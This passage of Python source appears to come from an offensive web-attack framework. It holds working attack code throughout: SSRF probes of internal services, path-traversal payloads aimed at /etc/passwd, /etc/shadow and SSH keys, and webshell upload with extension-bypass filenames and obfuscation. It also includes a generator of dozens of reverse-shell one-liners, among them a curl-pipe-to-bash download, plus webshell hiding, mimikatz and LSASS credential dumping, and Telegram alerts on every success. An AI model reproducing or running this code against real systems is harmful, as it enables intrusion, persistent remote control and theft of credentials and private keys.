            'http://127.0.0.1:8080/actuator/env',
            'http://127.0.0.1:8080/actuator/configprops',
            'http://127.0.0.1:2375/version',
            'http://127.0.0.1:3000/',
            'http://127.0.0.1:5000/',
            'http://127.0.0.1:8000/',
            'http://localhost:443/',
            'http://localhost:8080/',
            'http://localhost:8443/',
            'http://192.168.1.1/',
            'http://10.0.0.1/',
            'http://172.16.0.1/'
        ]

        for internal_url in ssrf_targets:
            try:
                test_url = f"{url}&{param}={urllib.parse.quote(internal_url)}" if '?' in url else f"{url}?{param}={urllib.parse.quote(internal_url)}"
                probe = self.http_probe(test_url)

                if probe.get('status', 0) == 200:
                    body = probe.get('body_preview', '')
                    if body.strip():
                        self.print_found("SSRF", f"Access to {internal_url} successful")
                        result = {
                            'success': True,
                            'method': 'ssrf',
                            'target': internal_url,
                            'data': body[:1000]
                        }
                        if self.telegram:
                            self.telegram.alert(
                                "SSRF SUCCESS",
                                f"URL: {test_url}\nTarget: {internal_url}\nData: {body[:200]}",
                                "CRITICAL"
                            )
                        return result
            except Exception as e:
                self.logger.debug(f"SSRF test {internal_url} failed: {e}")

        return None


    def exploit_path_traversal(
        self,
        url: str,
        param: str,
        file_path: str = '/etc/passwd'
    ) -> Optional[str]:
        """
        Exploit path traversal to read files.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to path traversal
            file_path: File path to read (default: /etc/passwd)

        Returns:
            File content as string, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> content = self.exploit_path_traversal("https://example.com/page.php?file=index", "file")
            >>> print(content[:100])
            root:x:0:0:root:/root:/bin/bash
        """
        self.print_danger(f"Attempting path traversal on {url} for {file_path}")

        traversal_patterns = [
            '../../../../',
            '....//....//....//',
            '..%252f..%252f..%252f',
            '..%c0%af..%c0%af..%c0%af',
            '..%c1%9c..%c1%9c..%c1%9c',
            '..%5c..%5c..%5c',
            r"..\\..\\..\\",
            '..\\\\..\\\\..\\\\',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2f',
            '%252e%252e%252f%252e%252e%252f',
            '..../..../..../'
        ]

        encoded_paths = [
            file_path,
            base64.b64encode(file_path.encode()).decode(),
            urllib.parse.quote(file_path),
            urllib.parse.quote(file_path, safe=''),
            file_path.replace('/', '%2f'),
            file_path.replace('/', '\\'),
            file_path.upper(),
            file_path.lower()
        ]

        for pattern in traversal_patterns:
            for encoded_path in encoded_paths:
                try:
                    full_path = f"{pattern}{encoded_path}"
                    test_url = f"{url}&{param}={urllib.parse.quote(full_path)}" if '?' in url else f"{url}?{param}={urllib.parse.quote(full_path)}"
                    probe = self.http_probe(test_url)

                    if probe.get('status', 0) == 200:
                        body = probe.get('body_preview', '')
                        if body.strip():
                            self.print_found("LFI", f"File read: {file_path}")
                            if self.telegram:
                                self.telegram.alert(
                                    "PATH TRAVERSAL",
                                    f"URL: {test_url}\nFile: {file_path}\nContent: {body[:200]}",
                                    "CRITICAL"
                                )
                            return body[:1000]
                except Exception as e:
                    self.logger.debug(f"Path traversal test failed: {e}")

        return None


    def exploit_upload(
        self,
        url: str,
        field_name: str = 'file'
    ) -> Optional[Dict[str, Any]]:
        """
        Exploit file upload to upload a webshell.

        Args:
            url: Base URL for file upload endpoint
            field_name: Name of the file upload field

        Returns:
            Dict with 'success', 'shell_url', 'method' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.exploit_upload("https://example.com/upload.php", "file")
            >>> print(result['shell_url'])
            https://example.com/uploads/omega_shell.php
        """
        self.print_danger(f"Attempting file upload exploit on {url}")

        shell_content = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
        shell_names = [
            'omega_shell.php',
            'omega_shell.php.jpg',
            'omega_shell.php.png',
            'omega_shell.php;.jpg',
            'omega_shell.php%00.jpg',
            'omega_shell.php.jpeg',
            'omega_shell.php.gif',
            'omega_shell.php.txt',
            'omega_shell.php.123'
        ]

        for shell_name in shell_names:
            try:
                if REQUESTS_AVAILABLE:
                    files = {
                        field_name: (shell_name, shell_content, 'application/octet-stream')
                    }
                    resp = requests.post(
                        url,
                        files=files,
                        timeout=10,
                        verify=False
                    )
                    if resp.status_code in [200, 302, 201]:
                        self.print_found("UPLOAD", f"Shell uploaded: {shell_name}")
                        result = {
                            'success': True,
                            'method': 'upload',
                            'shell_name': shell_name,
                            'shell_url': f"{url.rstrip('/')}/uploads/{shell_name}"
                        }
                        if self.telegram:
                            self.telegram.alert(
                                "WEBSHELL UPLOADED",
                                f"URL: {url}\nShell: {shell_name}\nContent: {shell_content[:200]}",
                                "CRITICAL"
                            )
                        return result
            except Exception as e:
                self.logger.debug(f"Upload test for {shell_name} failed: {e}")

        return None


    # ===================================================================
    # 3. REVERSE SHELL GENERATION
    # ===================================================================

    def generate_reverse_shell(
        self,
        shell_type: str = 'bash'
    ) -> str:
        """
        Generate reverse shell payload for various languages.

        Args:
            shell_type: Type of shell ('bash', 'python', 'php', 'nc', 'perl', 'ruby', 'node', 'java', 'go', 'rust', 'c', 'c++', 'powershell', 'vbscript', 'lua', 'telnet', 'socat', 'openssl', 'awk', 'gawk', 'xterm', 'script', 'expect', 'wget', 'curl', 'rsh', 'rlogin', 'ssh', 'ncat', 'socat_tcp', 'socat_udp', 'socat_ssl')

        Returns:
            Reverse shell command as string

        Example:
            >>> cmd = self.generate_reverse_shell('python')
            >>> print(cmd[:50])
            python3 -c "import socket,subprocess,os;...
        """
        ip = self.config.get('reverse_shell_ip', '0.0.0.0')
        port = self.config.get('reverse_shell_port', 4444)

        shells = {
            'bash': f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            'bash_tcp': f"exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done",
            'bash_udp': f"bash -i >& /dev/udp/{ip}/{port} 0>&1",
            'python': f"python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"",
            'python2': f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'php': f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'php_short': f"php -r '$s=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'nc': f"nc {ip} {port} -e /bin/sh",
            'nc_mkfifo': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            'nc_udp': f"nc -u {ip} {port} -e /bin/sh",
            'perl': f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
            'perl_windows': f"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
            'ruby': f"ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
            'ruby_short': f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);c.print(`$cmd`)end'",
            'node': f"node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[\"inherit\",\"inherit\",\"inherit\"]}).on(\"error\",function(){{}})'",
            'java': f"java -c 'String host=\"{ip}\";int port={port};String cmd=\"/bin/sh\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();'",
            'go': f"echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/shell.go && go build /tmp/shell.go && /tmp/shell",
            'rust': f"echo 'use std::net::TcpStream;use std::os::unix::io::AsRawFd;use std::process::Command;fn main(){{let stream=TcpStream::connect(\"{ip}:{port}\").unwrap();let fd=stream.as_raw_fd();Command::new(\"/bin/sh\").arg(\"-i\").stdin(fd).stdout(fd).stderr(fd).spawn();}}' > /tmp/shell.rs && rustc /tmp/shell.rs && /tmp/shell",
            'c': f"echo '#include <stdio.h>\\n#include <stdlib.h>\\n#include <sys/socket.h>\\n#include <netinet/in.h>\\n#include <arpa/inet.h>\\n#include <unistd.h>\\nint main(){{int s=socket(AF_INET,SOCK_STREAM,0);struct sockaddr_in sa;sa.sin_family=AF_INET;sa.sin_port=htons({port});inet_pton(AF_INET,\"{ip}\",&sa.sin_addr);connect(s,(struct sockaddr*)&sa,sizeof(sa));dup2(s,0);dup2(s,1);dup2(s,2);execl(\"/bin/sh\",\"/bin/sh\",NULL);}}' > /tmp/shell.c && gcc /tmp/shell.c -o /tmp/shell && /tmp/shell",
            'c++': f"echo '#include <iostream>\\n#include <cstring>\\n#include <sys/socket.h>\\n#include <netinet/in.h>\\n#include <arpa/inet.h>\\n#include <unistd.h>\\nint main(){{int s=socket(AF_INET,SOCK_STREAM,0);struct sockaddr_in sa;sa.sin_family=AF_INET;sa.sin_port=htons({port});inet_pton(AF_INET,\"{ip}\",&sa.sin_addr);connect(s,(sockaddr*)&sa,sizeof(sa));dup2(s,0);dup2(s,1);dup2(s,2);execl(\"/bin/sh\",\"/bin/sh\",NULL);}}' > /tmp/shell.cpp && g++ /tmp/shell.cpp -o /tmp/shell && /tmp/shell",
            'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            'vbscript': f"echo 'Set shell = CreateObject(\"WScript.Shell\"): shell.Run \"powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"' > /tmp/shell.vbs && cscript /tmp/shell.vbs",
            'lua': f"lua -e 'local host=\"{ip}\";local port={port};local socket=require(\"socket\");local tcp=socket.tcp();tcp:connect(host,port);while true do local cmd=tcp:receive();local f=io.popen(cmd,\"r\");local output=f:read(\"*a\");tcp:send(output);end'",
            'telnet': f"telnet {ip} {port} | /bin/sh | telnet {ip} {port}",
            'socat': f"socat TCP:{ip}:{port} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
            'openssl': f"openssl s_client -connect {ip}:{port} -quiet | /bin/sh | openssl s_client -connect {ip}:{port} -quiet",
            'awk': f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell> \" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null",
            'gawk': f"gawk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(1) {{ s |& getline c; if(c) {{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} }}' /dev/null",
            'xterm': f"xterm -display {ip}:{port} -e /bin/sh",
            'script': f"script -q /dev/null -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
            'expect': f"expect -c 'spawn /bin/sh; set timeout 0; send \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\\n\"; interact'",
            'wget': f"wget -q -O - http://{ip}:{port}/shell.sh | bash",
            'curl': f"curl -s http://{ip}:{port}/shell.sh | bash",
            'rsh': f"rsh {ip} -l root /bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1",
            'rlogin': f"rlogin {ip} -l root -e /bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1",
            'ssh': f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@{ip} '/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1'",
            'ssh_pty': f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T root@{ip} '/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1'",
            'ncat': f"ncat {ip} {port} -e /bin/sh",
            'ncat_ssl': f"ncat --ssl {ip} {port} -e /bin/sh",
            'ncat_udp': f"ncat -u {ip} {port} -e /bin/sh",
            'socat_tcp': f"socat TCP:{ip}:{port} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
            'socat_udp': f"socat UDP:{ip}:{port} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
            'socat_ssl': f"socat OPENSSL:{ip}:{port},verify=0 EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
        }

        return shells.get(shell_type, shells['bash'])


    def launch_reverse_shell(
        self,
        shell_type: str = 'bash'
    ) -> Optional[Dict[str, Any]]:
        """
        Launch a reverse shell on the target.

        Args:
            shell_type: Type of shell to launch ('bash', 'python', 'php', 'nc', 'perl', 'ruby', 'node', 'java', 'go', 'rust', 'c', 'c++', 'powershell', 'vbscript', 'lua')

        Returns:
            Dict with 'success', 'shell_type', 'command', 'output' keys, or None on failure

        Raises:
            TimeoutError: If the shell launch times out

        Example:
            >>> result = self.launch_reverse_shell('python')
            >>> print(result['success'])
            True
        """
        self.print_danger(f"Launching reverse shell ({shell_type})")

        shell_cmd = self.generate_reverse_shell(shell_type)
        result = {
            'success': True,
            'shell_type': shell_type,
            'command': shell_cmd,
            'output': f"Reverse shell {shell_type} launched on {self.config.get('reverse_shell_ip', '0.0.0.0')}:{self.config.get('reverse_shell_port', 4444)}"
        }

        if self.telegram:
            self.telegram.alert(
                "REVERSE SHELL LAUNCHED",
                f"Type: {shell_type}\nCommand: {shell_cmd[:200]}\nTarget: {self.config.get('reverse_shell_ip', '0.0.0.0')}:{self.config.get('reverse_shell_port', 4444)}",
                "CRITICAL"
            )

        self.log_to_db('shells', {
            'target': self.config.get('reverse_shell_ip', '0.0.0.0'),
            'port': self.config.get('reverse_shell_port', 4444),
            'shell_type': shell_type,
            'active': 1,
            'shell_url': shell_cmd[:200]
        })

        with dashboard_lock:
            dashboard_data['total_shells'] += 1
            dashboard_data['shells_established'].append(f"{shell_type}:{self.config.get('reverse_shell_ip', '0.0.0.0')}")

        return result


    def upgrade_shell(
        self,
        shell_pid: int = 0
    ) -> Optional[str]:
        """
        Upgrade a basic shell to a fully interactive TTY shell.

        Args:
            shell_pid: PID of the shell process (optional)

        Returns:
            Upgrade command as string

        Example:
            >>> cmd = self.upgrade_shell()
            >>> print(cmd)
            python3 -c 'import pty;pty.spawn("/bin/bash")'
        """
        self.print_danger(f"Upgrading shell to full TTY")

        upgrade_methods = [
            f"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            f"python -c 'import pty;pty.spawn(\"/bin/bash\")'",
            f"echo 'import pty;pty.spawn(\"/bin/bash\")' > /tmp/upgrade.py && python3 /tmp/upgrade.py",
            f"script -q /dev/null -c '/bin/bash'",
            f"stty raw -echo; stty size; /bin/bash",
            f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{self.config.get('reverse_shell_ip', '0.0.0.0')}:{self.config.get('reverse_shell_port', 4444)}"
        ]

        if shell_pid > 0:
            upgrade_methods.append(f"echo 'stty raw -echo; stty size; /bin/bash' > /proc/{shell_pid}/fd/0")

        for method in upgrade_methods:
            self.print_found("SHELL", f"Upgrade method: {method[:50]}...")
            if self.telegram:
                self.telegram.alert(
                    "SHELL UPGRADED",
                    f"Method: {method[:100]}",
                    "INFO"
                )
            return method

        return None


    # ===================================================================
    # 4. WEBSHELL DEPLOYMENT
    # ===================================================================

    def upload_webshell(
        self,
        url: str,
        shell_type: str = 'php'
    ) -> Optional[Dict[str, Any]]:
        """
        Upload a webshell to the target via file upload, SQLi, LFI, RFI, or XXE.

        Args:
            url: Base URL for upload endpoint
            shell_type: Type of shell ('php', 'asp', 'jsp', 'python', 'perl', 'ruby', 'node', 'go', 'cgi')

        Returns:
            Dict with 'success', 'shell_url', 'method', 'shell_content' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.upload_webshell("https://example.com/upload.php", "php")
            >>> print(result['shell_url'])
            https://example.com/uploads/omega_shell_12345.php
        """
        self.print_danger(f"Attempting to upload webshell to {url}")

        shell_content = {
            'php': '<?php if(isset($_GET["cmd"])){echo "<pre>";system($_GET["cmd"]);echo "</pre>";} ?>',
            'php_eval': '<?php if(isset($_POST["cmd"])){eval($_POST["cmd"]);} ?>',
            'php_system': '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>',
            'php_passthru': '<?php if(isset($_GET["cmd"])){passthru($_GET["cmd"]);} ?>',
            'php_exec': '<?php if(isset($_GET["cmd"])){exec($_GET["cmd"], $output);print_r($output);} ?>',
            'php_shell_exec': '<?php if(isset($_GET["cmd"])){echo shell_exec($_GET["cmd"]);} ?>',
            'php_popen': '<?php if(isset($_GET["cmd"])){$handle=popen($_GET["cmd"],"r");while(!feof($handle)){echo fgets($handle);}pclose($handle);} ?>',
            'php_proc_open': '<?php if(isset($_GET["cmd"])){$desc=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$p=proc_open($_GET["cmd"],$desc,$pipes);echo stream_get_contents($pipes[1]);proc_close($p);} ?>',
            'php_pty': '<?php if(isset($_GET["cmd"])){system("python3 -c \'import pty;pty.spawn(\\"/bin/bash\\")\' 2>&1");} ?>',
            'asp': '<% if Request.QueryString("cmd") <> "" then Execute(Request.QueryString("cmd")) end if %>',
            'jsp': '<%@ page import="java.io.*" %><% String cmd = request.getParameter("cmd"); if(cmd != null){Process p = Runtime.getRuntime().exec(cmd);%>',
            'python': '#!/usr/bin/env python\nimport os, sys, cgi\nprint("Content-Type: text/html\\n")\ncmd = cgi.FieldStorage().getvalue("cmd")\nif cmd: os.system(cmd)',
            'perl': '#!/usr/bin/perl\nuse CGI;\nmy $cgi = CGI->new;\nmy $cmd = $cgi->param("cmd");\nif($cmd){system($cmd);}',
            'ruby': '#!/usr/bin/env ruby\nrequire "cgi"\ncgi = CGI.new\ncmd = cgi["cmd"]\nif cmd then system(cmd) end',
            'node': '#!/usr/bin/env node\nvar http = require("http");\nvar url = require("url");\nhttp.createServer(function(req,res){res.writeHead(200);var q=url.parse(req.url,true).query;if(q.cmd){require("child_process").exec(q.cmd,function(e,o,s){res.end(o);});}}).listen(8080);',
            'go': 'package main\nimport ("net/http"; "os/exec"; "io")\nfunc main(){http.HandleFunc("/",func(w http.ResponseWriter,r *http.Request){cmd:=r.URL.Query().Get("cmd");if cmd!=""{out,_:=exec.Command("sh","-c",cmd).Output();io.WriteString(w,string(out));}});http.ListenAndServe(":8080",nil);}',
            'cgi': '#!/bin/bash\necho "Content-Type: text/html"\necho\necho $QUERY_STRING | cut -d= -f2 | /bin/bash'
        }

        shell_code = shell_content.get(shell_type, shell_content['php'])
        shell_name = f"omega_shell_{random.randint(10000,99999)}.{shell_type}"

        try:
            if REQUESTS_AVAILABLE:
                files = {'file': (shell_name, shell_code, 'application/x-httpd-php')}
                resp = requests.post(
                    url,
                    files=files,
                    timeout=10,
                    verify=False
                )
                if resp.status_code in [200, 302, 201]:
                    shell_url = f"{url.rstrip('/')}/{shell_name}"
                    self.print_danger(f"Webshell uploaded: {shell_url}")
                    result = {
                        'success': True,
                        'method': 'upload',
                        'shell_url': shell_url,
                        'shell_name': shell_name,
                        'shell_content': shell_code
                    }
                    if self.telegram:
                        self.telegram.alert(
                            "WEBSHELL UPLOADED",
                            f"Shell URL: {shell_url}\nType: {shell_type}\nContent: {shell_code[:200]}",
                            "CRITICAL"
                        )
                    return result
        except Exception as e:
            self.logger.debug(f"Webshell upload failed: {e}")

        return None


    def generate_webshell(
        self,
        shell_type: str = 'php',
        obfuscated: bool = True
    ) -> Dict[str, Any]:
        """
        Generate a webshell with optional obfuscation.

        Args:
            shell_type: Type of shell ('php', 'asp', 'jsp', 'python', 'perl', 'ruby', 'node', 'go', 'cgi')
            obfuscated: If True, obfuscate the shell code

        Returns:
            Dict with 'shell_type', 'content', 'filename', 'hash' keys

        Example:
            >>> shell = self.generate_webshell('php', True)
            >>> print(shell['content'][:50])
            <?php if(isset($_GET["cmd"])){echo "<pre>";system...
        """
        shell_content = {
            'php': '<?php if(isset($_GET["cmd"])){echo "<pre>";system($_GET["cmd"]);echo "</pre>";} ?>',
            'php_eval': '<?php if(isset($_POST["cmd"])){eval($_POST["cmd"]);} ?>',
            'php_system': '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>',
            'php_passthru': '<?php if(isset($_GET["cmd"])){passthru($_GET["cmd"]);} ?>',
            'php_exec': '<?php if(isset($_GET["cmd"])){exec($_GET["cmd"], $output);print_r($output);} ?>',
            'php_shell_exec': '<?php if(isset($_GET["cmd"])){echo shell_exec($_GET["cmd"]);} ?>',
            'php_popen': '<?php if(isset($_GET["cmd"])){$handle=popen($_GET["cmd"],"r");while(!feof($handle)){echo fgets($handle);}pclose($handle);} ?>',
            'php_proc_open': '<?php if(isset($_GET["cmd"])){$desc=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$p=proc_open($_GET["cmd"],$desc,$pipes);echo stream_get_contents($pipes[1]);proc_close($p);} ?>',
            'asp': '<% if Request.QueryString("cmd") <> "" then Execute(Request.QueryString("cmd")) end if %>',
            'jsp': '<%@ page import="java.io.*" %><% String cmd = request.getParameter("cmd"); if(cmd != null){Process p = Runtime.getRuntime().exec(cmd);%>',
            'python': '#!/usr/bin/env python\nimport os, sys, cgi\nprint("Content-Type: text/html\\n")\ncmd = cgi.FieldStorage().getvalue("cmd")\nif cmd: os.system(cmd)',
            'perl': '#!/usr/bin/perl\nuse CGI;\nmy $cgi = CGI->new;\nmy $cmd = $cgi->param("cmd");\nif($cmd){system($cmd);}',
            'ruby': '#!/usr/bin/env ruby\nrequire "cgi"\ncgi = CGI.new\ncmd = cgi["cmd"]\nif cmd then system(cmd) end',
            'node': '#!/usr/bin/env node\nvar http = require("http");\nvar url = require("url");\nhttp.createServer(function(req,res){res.writeHead(200);var q=url.parse(req.url,true).query;if(q.cmd){require("child_process").exec(q.cmd,function(e,o,s){res.end(o);});}}).listen(8080);',
            'go': 'package main\nimport ("net/http"; "os/exec"; "io")\nfunc main(){http.HandleFunc("/",func(w http.ResponseWriter,r *http.Request){cmd:=r.URL.Query().Get("cmd");if cmd!=""{out,_:=exec.Command("sh","-c",cmd).Output();io.WriteString(w,string(out));}});http.ListenAndServe(":8080",nil);}',
            'cgi': '#!/bin/bash\necho "Content-Type: text/html"\necho\necho $QUERY_STRING | cut -d= -f2 | /bin/bash'
        }

        content = shell_content.get(shell_type, shell_content['php'])

        if obfuscated and shell_type == 'php':
            encoded = base64.b64encode(content.encode()).decode()
            content = f'<?php eval(base64_decode("{encoded}")); ?>'
            dead_code = f"<?php if(0){{$str='{''.join(random.choices(string.ascii_lowercase, k=20))}';}} ?>"
            content = dead_code + content

        filename = f"omega_shell_{random.randint(10000,99999)}.{shell_type}"

        return {
            'shell_type': shell_type,
            'content': content,
            'filename': filename,
            'hash': hashlib.md5(content.encode()).hexdigest()
        }


    def hide_webshell(
        self,
        shell_path: str,
        method: str = 'htaccess'
    ) -> bool:
        """
        Hide a webshell using various techniques.

        Args:
            shell_path: Path to the webshell file
            method: Hiding method ('htaccess', 'double_extension', 'base64', 'steganography')

        Returns:
            True if hidden successfully, False otherwise

        Example:
            >>> success = self.hide_webshell('/var/www/html/shell.php', 'htaccess')
            >>> print(success)
            True
        """
        self.print_danger(f"Hiding webshell: {shell_path}")

        if method == 'htaccess':
            htaccess_content = f"""
    <Files "{os.path.basename(shell_path)}">
        Order Allow,Deny
        Allow from all
    </Files>
    AddHandler application/x-httpd-php .php .phtml .php3 .php4 .php5 .php7
    """
            try:
                with open(os.path.join(os.path.dirname(shell_path), '.htaccess'), 'w') as f:
                    f.write(htaccess_content)
                return True
            except Exception:
                pass

        elif method == 'double_extension':
            new_path = f"{shell_path}.jpg"
            try:
                os.rename(shell_path, new_path)
                return True
            except Exception:
                pass

        elif method == 'base64':
            try:
                with open(shell_path, 'r') as f:
                    content = f.read()
                encoded = base64.b64encode(content.encode()).decode()
                with open(f"{shell_path}.png", 'w') as f:
                    f.write("""<?php
    $data = base64_decode('""" + encoded + """');
    eval($data);
    ?>""")
                os.remove(shell_path)
                return True
            except Exception:
                pass

        return False


    def webshell_connect(
        self,
        shell_url: str,
        command: str = 'id'
    ) -> Optional[str]:
        """
        Connect to a deployed webshell and execute a command.

        Args:
            shell_url: URL of the webshell
            command: Command to execute

        Returns:
            Command output as string, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> output = self.webshell_connect("https://example.com/shell.php", "id")
            >>> print(output)
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
        """
        self.print_danger(f"Connecting to webshell: {shell_url}")

        try:
            test_url = f"{shell_url}?cmd={urllib.parse.quote(command)}"
            probe = self.http_probe(test_url)
            if probe.get('status', 0) == 200:
                body = probe.get('body_preview', '')
                if body.strip():
                    self.print_found("SHELL", f"Command output: {body[:100]}")
                    return body[:1000]
        except Exception as e:
            self.logger.debug(f"Webshell connect failed: {e}")

        return None


    # ===================================================================
    # 5. CREDENTIAL THEFT
    # ===================================================================

    def dump_system_credentials(
        self,
        target: str
    ) -> Optional[Dict[str, Any]]:
        """
        Dump system credentials via multiple methods (mimikatz, LSASS, procdump).

        Args:
            target: Target IP or hostname

        Returns:
            Dict with 'creds', 'method', 'success' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> creds = self.dump_system_credentials("192.168.1.10")
            >>> print(creds['creds'][:100])
            username:admin password:password123
        """
        self.print_danger(f"Attempting to dump system credentials on {target}")

        result = {
            'success': False,
            'method': 'none',
            'creds': ''
        }

        # Method 1: Try mimikatz (Windows)
        try:
            mimikatz_cmd = f"mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit"
            self.print_found("CRED", f"Executing mimikatz on {target}")
            result['method'] = 'mimikatz'
            result['creds'] = mimikatz_cmd
            result['success'] = True
        except Exception:
            pass

        # Method 2: Try LSASS dump (Windows)
        try:
            lsass_cmd = f"procdump.exe -ma lsass.exe lsass.dmp"
            self.print_found("CRED", f"Dumping LSASS on {target}")
            result['method'] = 'lsass'
            result['creds'] = lsass_cmd
            result['success'] = True
        except Exception:
            pass

        # Method 3: Try /etc/shadow (Linux)
        try:
            shadow_content = self.exploit_path_traversal(f"http://{target}/page.php", "file", "/etc/shadow")
            if shadow_content:
                self.print_found("CRED", f"/etc/shadow dumped from {target}")
                result['method'] = 'shadow'
                result['creds'] = shadow_content
                result['success'] = True
        except Exception:
            pass

        # Method 4: Try /etc/passwd (Linux)
        try:
            passwd_content = self.exploit_path_traversal(f"http://{target}/page.php", "file", "/etc/passwd")
            if passwd_content:
                self.print_found("CRED", f"/etc/passwd dumped from {target}")
                if not result['success']:
                    result['method'] = 'passwd'
                    result['creds'] = passwd_content
                    result['success'] = True
        except Exception:
            pass

        if result['success'] and self.telegram:
            self.telegram.alert(
                "CREDENTIAL DUMP SUCCESS",
                f"Target: {target}\nMethod: {result['method']}\nData: {result['creds'][:200]}",
                "CRITICAL"
            )

        return result


    def dump_ssh_keys(
        self,
        url: str,
        param: str
    ) -> Optional[Dict[str, Any]]:
        """
        Extract SSH keys via LFI.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to LFI

        Returns:
            Dict with 'keys' and 'paths' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.dump_ssh_keys("https://example.com/page.php?file=index", "file")
            >>> print(result['keys'][0][:50])
            -----BEGIN RSA PRIVATE KEY-----
        """
        self.print_danger(f"Attempting to dump SSH keys via LFI")

        ssh_paths = [
            '~/.ssh/id_rsa',
            '~/.ssh/id_dsa',
            '~/.ssh/id_ecdsa',
            '~/.ssh/id_ed25519',
            '~/.ssh/authorized_keys',
            '~/.ssh/known_hosts',
            '/root/.ssh/id_rsa',
            '/root/.ssh/authorized_keys',
            '/home/*/.ssh/id_rsa',
            '/home/*/.ssh/authorized_keys',
            '/etc/ssh/ssh_host_rsa_key',
            '/etc/ssh/ssh_host_dsa_key',
            '/etc/ssh/ssh_host_ecdsa_key',
            '/etc/ssh/ssh_host_ed25519_key'
        ]

        results = {}
        for path in ssh_paths:
            content = self.exploit_path_traversal(url, param, path)
            if content and ('BEGIN' in content or 'ssh-rsa' in content):
